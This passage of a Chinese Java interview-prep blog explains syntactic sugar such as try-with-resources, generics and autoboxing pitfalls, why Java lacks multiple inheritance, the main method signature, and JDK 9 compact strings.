&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>从Java 7开始，jdk提供了一种更好的方式关闭资源，使用<code>try-with-resources</code>语句，改写一下上面的代码，效果如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String... args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;d:\\ hollischuang.xml&quot;</span>))) &#123;</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="comment">// handle exception</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>看，这简直是一大福音啊，虽然我之前一般使用<code>IOUtils</code>去关闭流，并不会使用在<code>finally</code>中写很多代码的方式，但是这种新的语法糖看上去好像优雅很多呢。看下他的背后：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">transient</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span></span><br><span class="line">&#123;</span><br><span class="line">    BufferedReader br;</span><br><span class="line">    Throwable throwable;</span><br><span class="line">    br = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;d:\\ hollischuang.xml&quot;</span>));</span><br><span class="line">    throwable = <span class="literal">null</span>;</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>((line = br.readLine()) != <span class="literal">null</span>)</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Throwable throwable2)</span><br><span class="line">        &#123;</span><br><span class="line">            throwable = throwable2;</span><br><span class="line">            <span class="keyword">throw</span> throwable2;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span>(br != <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">if</span>(throwable != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    br.close();</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">catch</span>(Throwable throwable1)</span><br><span class="line">                &#123;</span><br><span class="line">                    throwable.addSuppressed(throwable1);</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            br.close();</span><br><span class="line">    <span class="keyword">break</span> MISSING_BLOCK_LABEL_113;</span><br><span class="line">    Exception exception;</span><br><span class="line">    exception;</span><br><span class="line">    <span class="keyword">if</span>(br != <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">if</span>(throwable != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    br.close();</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">catch</span>(Throwable throwable3)</span><br><span class="line">                &#123;</span><br><span class="line">                    throwable.addSuppressed(throwable3);</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            br.close();</span><br><span class="line">    <span class="keyword">throw</span> exception;</span><br><span class="line">    IOException ioexception;</span><br><span class="line">    ioexception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>其实背后的原理也很简单，那些我们没有做的关闭资源的操作，编译器都帮我们做了。所以，再次印证了，语法糖的作用就是方便程序员的使用，但最终还是要转成编译器认识的语言。</strong></p>
<h3 id="糖块十二、Lambda表达式"><a href="#糖块十二、Lambda表达式" class="headerlink" title="糖块十二、Lambda表达式"></a>糖块十二、Lambda表达式</h3><h3 id="可能遇到的坑"><a href="#可能遇到的坑" class="headerlink" title="可能遇到的坑"></a>可能遇到的坑</h3><h4 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h4><p><strong>一、当泛型遇到重载</strong> </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GenericTypes</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">(List&lt;String&gt; list)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;invoke method(List&lt;String&gt; list)&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">(List&lt;Integer&gt; list)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;invoke method(List&lt;Integer&gt; list)&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>上面这段代码，有两个重载的函数，因为他们的参数类型不同，一个是List<String> 另一个是List<Integer> ，但是，这段代码是编译通不过的。因为我们前面讲过，参数List<String>和List<Integer>编译之后都被擦除了，变成了一样的原生类型List，擦除动作导致这两个方法的特征签名变得一模一样。</p>
<p><strong>二、当泛型遇到catch</strong> 泛型的类型参数不能用在Java异常处理的catch语句中。因为异常处理是由JVM在运行时刻来进行的。由于类型信息被擦除，JVM是无法区分两个异常类型<code>MyException&lt;String&gt;</code>和<code>MyException&lt;Integer&gt;</code>的</p>
<p><strong>三、当泛型内包含静态变量</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticTest</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        GT&lt;Integer&gt; gti = <span class="keyword">new</span> <span class="title class_">GT</span>&lt;Integer&gt;();</span><br><span class="line">        gti.<span class="keyword">var</span>=<span class="number">1</span>;</span><br><span class="line">        GT&lt;String&gt; gts = <span class="keyword">new</span> <span class="title class_">GT</span>&lt;String&gt;();</span><br><span class="line">        gts.<span class="keyword">var</span>=<span class="number">2</span>;</span><br><span class="line">        System.out.println(gti.<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GT</span>&lt;T&gt;&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="keyword">var</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">nothing</span><span class="params">(T x)</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>以上代码输出结果为：2！由于经过类型擦除，所有的泛型类实例都关联到同一份字节码上，泛型类的所有静态变量是共享的。</p>
<h4 id="自动装箱与拆箱"><a href="#自动装箱与拆箱" class="headerlink" title="自动装箱与拆箱"></a>自动装箱与拆箱</h4><p><strong>对象相等比较</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1000</span>;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">1000</span>;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">d</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">    System.out.println(<span class="string">&quot;a == b is &quot;</span> + (a == b));</span><br><span class="line">    System.out.println((<span class="string">&quot;c == d is &quot;</span> + (c == d)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>输出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a == b is false</span><br><span class="line">c == d is true</span><br></pre></td></tr></table></figure>



<p>在Java 5中，在Integer的操作上引入了一个新功能来节省内存和提高性能。整型对象通过使用相同的对象引用实现了缓存和重用。</p>
<blockquote>
<p>适用于整数值区间-128 至 +127。</p>
<p>只适用于自动装箱。使用构造函数创建对象不适用。</p>
</blockquote>
<h4 id="增强for循环"><a href="#增强for循环" class="headerlink" title="增强for循环"></a>增强for循环</h4><p><strong>ConcurrentModificationException</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Student stu : students) &#123;    </span><br><span class="line">    <span class="keyword">if</span> (stu.getId() == <span class="number">2</span>)     </span><br><span class="line">        students.remove(stu);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>会抛出<code>ConcurrentModificationException</code>异常。</p>
<p>Iterator是工作在一个独立的线程中，并且拥有一个 mutex 锁。 Iterator被创建之后会建立一个指向原来对象的单链索引表，当原来的对象数量发生变化时，这个索引表的内容不会同步改变，所以当索引指针往后移动的时候就找不到要迭代的对象，所以按照 fail-fast 原则 Iterator 会马上抛出<code>java.util.ConcurrentModificationException</code>异常。</p>
<p>所以 <code>Iterator</code> 在工作的时候是不允许被迭代的对象被改变的。但你可以使用 <code>Iterator</code> 本身的方法<code>remove()</code>来删除对象，<code>Iterator.remove()</code> 方法会在删除当前迭代对象的同时维护索引的一致性。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>前面介绍了12种Java中常用的语法糖。所谓语法糖就是提供给开发人员便于开发的一种语法而已。但是这种语法只有开发人员认识。要想被执行，需要进行解糖，即转成JVM认识的语法。当我们把语法糖解糖之后，你就会发现其实我们日常使用的这些方便的语法，其实都是一些其他更简单的语法构成的。</p>
<p>有了这些语法糖，我们在日常开发的时候可以大大提升效率，但是同时也要避免过渡使用。使用之前最好了解下原理，避免掉坑。</p>
<h1 id="✅为什么Java不支持多继承？"><a href="#✅为什么Java不支持多继承？" class="headerlink" title="✅为什么Java不支持多继承？"></a>✅为什么Java不支持多继承？</h1><h2 id="典型回答-14"><a href="#典型回答-14" class="headerlink" title="典型回答"></a>典型回答</h2><p>因为如果要实现多继承，就会像C++中一样，存在<strong>菱形继承</strong>的问题，C++为了解决菱形继承问题，又引入了<strong>虚继承</strong>。因为支持多继承，引入了菱形继承问题，又因为要解决菱形继承问题，引入了虚继承。而经过分析，人们发现我们其实真正想要使用多继承的情况并不多。所以，在 Java 中，不允许“多继承”，即一个类不允许继承多个父类。</p>
<p>除了菱形的问题，支持多继承复杂度也会增加。一个类继承了多个父类，可能会继承大量的属性和方法，导致类的接口变得庞大、难以理解和维护。此外，在修改一个父类时，可能会影响到多个子类，增加了代码的耦合度。</p>
<p>在Java 8以前，接口中是不能有方法的实现的。所以一个类同时实现多个接口的话，也不会出现C++中的歧义问题。因为所有方法都没有方法体，真正的实现还是在子类中的。但是，Java 8中支持了默认函数（default method ），即接口中可以定义一个有方法体的方法了。</p>
<p>而又因为Java支持同时实现多个接口，这就相当于通过implements就可以从多个接口中继承到多个方法了，但是，Java8中为了避免菱形继承的问题，在实现的多个接口中如果有相同方法，就会要求该类必须重写这个方法。</p>
<h2 id="扩展知识-6"><a href="#扩展知识-6" class="headerlink" title="扩展知识"></a>扩展知识</h2><h2 id="菱形继承问题"><a href="#菱形继承问题" class="headerlink" title="菱形继承问题"></a>菱形继承问题</h2><p>Java的创始人James Gosling曾经回答过，他表示：</p>
<p>“Java之所以不支持一个类继承多个类，主要是因为在设计之初我们听取了来自C++和Objective-C等阵营的人的意见。因为多继承会产生很多歧义问题。”</p>
<p>Gosling老人家提到的歧义问题，其实是C++因为支持多继承之后带来的菱形继承问题。</p>
<p>假设我们有类B和类C，它们都继承了相同的类A。另外我们还有类D，类D通过多重继承机制继承了类B和类C。</p>
<p><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/hexo/34247/img/hrgwLfOvG7v9ciWo/1672211742898-80096c34-a056-47fc-bf8b-0f45c4a64498-804798.jpeg" alt="1672211742898-80096c34-a056-47fc-bf8b-0f45c4a64498.jpeg"></p>
<p>这时候，因为D同时继承了B和C，并且B和C又同时继承了A，那么，D中就会因为多重继承，继承到两份来自A中的属性和方法。</p>
<p>这时候，在使用D的时候，如果想要调用一个定义在A中的方法时，就会出现歧义。</p>
<p>因为这样的继承关系的形状类似于菱形，因此这个问题被形象地称为菱形继承问题。</p>
<p>而C++为了解决菱形继承问题，又引入了<strong>虚继承</strong>。</p>
<p>因为支持多继承，引入了菱形继承问题，又因为要解决菱形继承问题，引入了虚继承。而经过分析，人们发现我们其实真正想要使用多继承的情况并不多。</p>
<p>所以，在 Java 中，不允许“声明多继承”，即一个类不允许继承多个父类。但是 Java 允许“实现多继承”，即一个类可以实现多个接口，一个接口也可以继承多个父接口。由于接口只允许有方法声明而不允许有方法实现（Java 8之前），这就避免了 C++ 中多继承的歧义问题。</p>
<h2 id="Java-8中的多继承"><a href="#Java-8中的多继承" class="headerlink" title="Java 8中的多继承"></a>Java 8中的多继承</h2><p>Java不支持多继承，但是是支持多实现的，也就是说，同一个类可以同时实现多个接口。</p>
<p>我们知道，在Java 8以前，接口中是不能有方法的实现的。所以一个类同时实现多个接口的话，也不会出现C++中的歧义问题。因为所有方法都没有方法体，真正的实现还是在子类中的。</p>
<p>那么问题来了。</p>
<p>Java 8中支持了默认函数（default method ），即接口中可以定义一个有方法体的方法了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public interface Pet &#123;</span><br><span class="line"></span><br><span class="line">    public default void eat()&#123;</span><br><span class="line">        System.out.println(&quot;Pet Is Eating&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>而又因为Java支持同时实现多个接口，这就相当于通过implements就可以从多个接口中继承到多个方法了，这不就是变相支持了多继承么。</p>
<p>那么，Java是怎么解决菱形继承问题的呢？我们再定义一个哺乳动物接口，也定义一个eat方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public interface Mammal &#123;</span><br><span class="line"></span><br><span class="line">    public default void eat()&#123;</span><br><span class="line">        System.out.println(&quot;Mammal Is Eating&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后定义一个Cat，让他分别实现两个接口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public class Cat implements Pet,Mammal &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时候，编译期会报错：</p>
<blockquote>
<p>error: class Cat inherits unrelated defaults for eat() from types Mammal and Pet</p>
</blockquote>
<p>这时候，就要求Cat类中，必须重写eat()方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class Cat implements Pet,Mammal &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void eat() &#123;</span><br><span class="line">        System.out.println(&quot;Cat Is Eating&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>所以可以看到，Java并没有帮我们解决多继承的歧义问题，而是把这个问题留给开发人员，通过重写方法的方式自己解决。</p>
<h2 id="✅为什么Java中的main方法必须是public-static-void的？"><a href="#✅为什么Java中的main方法必须是public-static-void的？" class="headerlink" title="✅为什么Java中的main方法必须是public static void的？"></a>✅为什么Java中的main方法必须是public static void的？</h2><h2 id="典型回答-15"><a href="#典型回答-15" class="headerlink" title="典型回答"></a>典型回答</h2><p>在Java中，想必所有人都不会对main方法感到陌生，main方法是Java应用程序的入口方法。程序运行时，要执行的第一个方法就是main方法。</p>
<p>我们创建的main方法的形式都是一样的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>首先都是public的、都是static的，返回值都是void，方法名都是main，入参都是一个字符串数组。</p>
<p>以上的方法声明中，唯一可以改变的的部分就是方法的参数名，你可以把args改成任意你想要使用的名字。</p>
<p><strong>main方法是JVM执行的入口，为了方便JVM调用，所以需要将他的访问权限设置为public，并且静态方法可以方便JVM直接调用，无需实例化对象。</strong></p>
<hr>
<p><strong>因为JVM的退出其实是不完全依赖main方法的，所以JVM并不会接收main方法的返回值，所以给main方法定义一个返回值没有任何意义。所以main方法的返回值为void。</strong></p>
<hr>
<p><strong>为了方便main函数可以接受多个字符串参数作为入参，所以他的形参类型被定义为String[]。</strong></p>
<h3 id="为什么-main-方法是公有的（public）？"><a href="#为什么-main-方法是公有的（public）？" class="headerlink" title="为什么 main 方法是公有的（public）？"></a>为什么 main 方法是公有的（public）？</h3><p>Java中，可以使用访问控制符来保护对类、变量、方法和构造方法的访问。Java 支持 4 种不同的访问权限。</p>
<ul>
<li>default : 即默认，什么也不写: 在同一包内可见，不使用任何修饰符。使用对象：类、接口、变量、方法。</li>
<li>private : 在同一类内可见。使用对象：变量、方法。 注意：不能修饰类（外部类）</li>
<li>public : 对所有类可见。使用对象：类、接口、变量、方法</li>
<li>protected : 对同一包内的类和所有子类可见。使用对象：变量、方法。 注意：不能修饰类（外部类）</li>
</ul>
<p>以上四种控制符都可以用来修饰方法，但是被修饰的方法的访问权限就不同了。</p>
<p>而对于main方法来说，我们需要通过JVM直接调用他，那么就需要他的限定符必须是public的，否则是无法访问的。</p>
<h3 id="为什么-main-方法是静态的（static）？"><a href="#为什么-main-方法是静态的（static）？" class="headerlink" title="为什么 main 方法是静态的（static）？"></a>为什么 main 方法是静态的（static）？</h3><p>static是静态修饰符，被他修饰的方法我们称之为静态方法，静态方法有一个特点，那就是静态方法独立于该类的任何对象，它不依赖类特定的实例，被类的所有实例共享。只要这个类被加载，Java虚拟机就能根据类名在运行时数据区的方法区内定找到他们。</p>
<p>而对于main方法来说，他的调用过程是经历了类加载、链接和初始化的。但是并没有被实例化过，这时候如果想要调用一个类中的方法。那么这个方法必须是静态方法，否则是无法调用的。</p>
<h3 id="为什么-main-方法没有返回值（void）？"><a href="#为什么-main-方法没有返回值（void）？" class="headerlink" title="为什么 main 方法没有返回值（void）？"></a>为什么 main 方法没有返回值（void）？</h3><p>如果大家对于C语言和C++语言有一定的了解的话，就会知道，像 C、C++ 这种以 int 为 main 函数返回值的编程语言。</p>
<p>这个返回值在是程序退出时的 exit code，一般被命令解释器或其他外部程序调用已确定流程是否完成。一般正常情况下用 0 返回，非 0 为异常退出。</p>
<p>而在Java中，这个退出过程是由JVM进行控制的，在发生以下两种情况时，程序会终止其所有行为并退出：</p>
<p>1、所有不是后台守护线程的线程全部终止。 </p>
<p>2、某个线程调用了Runtime类或者System类的exit方法，并且安全管理器并不禁止exit操作。</p>
<p>上面的两种情况中，第二种情况一旦发生，JVM是不会管main方法有没有执行完的，他都会终止所有行为并退出，这时候main方法的返回值是没有任何意义的。</p>
<p>所以，main方法的返回值就被固定要求为void。</p>
<h3 id="为什么-main-方法的入参是字符串数组（String-）"><a href="#为什么-main-方法的入参是字符串数组（String-）" class="headerlink" title="为什么 main 方法的入参是字符串数组（String[]）"></a>为什么 main 方法的入参是字符串数组（String[]）</h3><p>Java应用程序是可以通过命令行接受参数传入的，从命令行传递的参数可以在java程序中接收，并且可以用作输入。</p>
<p>因为命令行参数最终都是以字符串的形式传递的，并且有的时候命令行参数不止一个，所以就可能传递多个参数。</p>
<p>这时候，作为Java应用程序执行的入口，main方法就需要能够接受这多个字符串参数，那么就使用字符串数组了。</p>
<h1 id="✅为什么JDK-9中把String的char-改成了byte-？"><a href="#✅为什么JDK-9中把String的char-改成了byte-？" class="headerlink" title="✅为什么JDK 9中把String的char[]改成了byte[]？"></a>✅为什么JDK 9中把String的char[]改成了byte[]？</h1><h2 id="典型回答-16"><a href="#典型回答-16" class="headerlink" title="典型回答"></a>典型回答</h2><p>在Java 9之前，字符串内部是由字符数组char[] 来表示的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** The value is used for character storage. */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">char</span> value[];</span><br></pre></td></tr></table></figure>



<p>由于Java内部使用UTF-16，每个char占据两个字节，即使某些字符可以用一个字节（LATIN-1）表示，但是也仍然会占用两个字节。所以，JDK 9就对他做了优化。</p>
<p>这就是Java 9引入了”<strong>Compact String</strong>“的概念：</p>
<p>每当我们创建一个字符串时，如果它的所有字符都可以用单个字节（Latin-1）表示，那么将会在内部使用字节数组来保存一半所需的空间，但是如果有一个字符需要超过8位来表示，Java将继续使用UTF-16与字符数组。</p>
<blockquote>
<p>Latin1（又称ISO 8859-1）是一种字符编码格式，用于表示西欧语言，包括英语、法语、德语、西班牙语、葡萄牙语、意大利语等。它由国际标准化组织（ISO）定义，并涵盖了包括ASCII在内的128个字符。</p>
<p><strong>Latin1编码使用单字节编码方案，也就是说每个字符只占用一个字节</strong>，其中第一位固定为0，后面的七位可以表示128个字符。这样，Latin1编码可以很方便地与ASCII兼容。</p>
</blockquote>
<p>那么，问题来了 ，所有字符串操作时，它如何区分到底用Latin-1还是UTF-16表示呢？</p>
<p>为了解决这个问题，对String的内部实现进行了另一个更改。引入了一个名为coder的字段，用于保存这些信息。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The value is used for character storage.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@implNote</span> This field is trusted by the VM, and is a subject to</span></span><br><span class="line"><span class="comment"> * constant folding if String instance is constant. Overwriting this</span></span><br><span class="line"><span class="comment"> * field after construction will cause problems.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Additionally, it is marked with &#123;<span class="doctag">@link</span> Stable&#125; to trust the contents</span></span><br><span class="line"><span class="comment"> * of the array. No other facility in JDK provides this functionality (yet).</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> Stable&#125; is safe here, because value is never null.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Stable</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">byte</span>[] value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The identifier of the encoding used to encode the bytes in</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> value&#125;. The supported values in this implementation are</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * LATIN1</span></span><br><span class="line"><span class="comment"> * UTF16</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@implNote</span> This field is trusted by the VM, and is a subject to</span></span><br><span class="line"><span class="comment"> * constant folding if String instance is constant. Overwriting this</span></span><br><span class="line"><span class="comment"> * field after construction will cause problems.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">byte</span> coder;</span><br></pre></td></tr></table></figure>

<p><u></u></p>
<p>coder字段的取值可以是以下两种</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span> <span class="variable">LATIN1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span> <span class="variable">UTF16</span> <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>



<p>在很多字符串的相关操作中都需要做一下判断，如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">indexOf</span><span class="params">(<span class="type">int</span> ch, <span class="type">int</span> fromIndex)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> isLatin1() </span><br><span class="line">      ? StringLatin1.indexOf(value, ch, fromIndex) </span><br><span class="line">      : StringUTF16.indexOf(value, ch, fromIndex);</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isLatin1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> COMPACT_STRINGS &amp;&amp; coder == LATIN1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="✅为什么不建议使用异常控制业务流程"><a href="#✅为什么不建议使用异常控制业务流程" class="headerlink" title="✅为什么不建议使用异常控制业务流程"></a>✅为什么不建议使用异常控制业务流程</h1><h2 id="典型回答-17"><a href="#典型回答-17" class="headerlink" title="典型回答"></a>典型回答</h2><p>在《Effecitive Java》中，作者提出过，不建议使用异常来控制业务流程。很多人 不理解，啥叫用异常控制业务流程。</p>
<p>给大家举个简单的例子，在解决幂等问题时，我们有的人会这么做，先插入，然后再捕获唯一性约束冲突异常，再反查，返回幂等。如：</p>
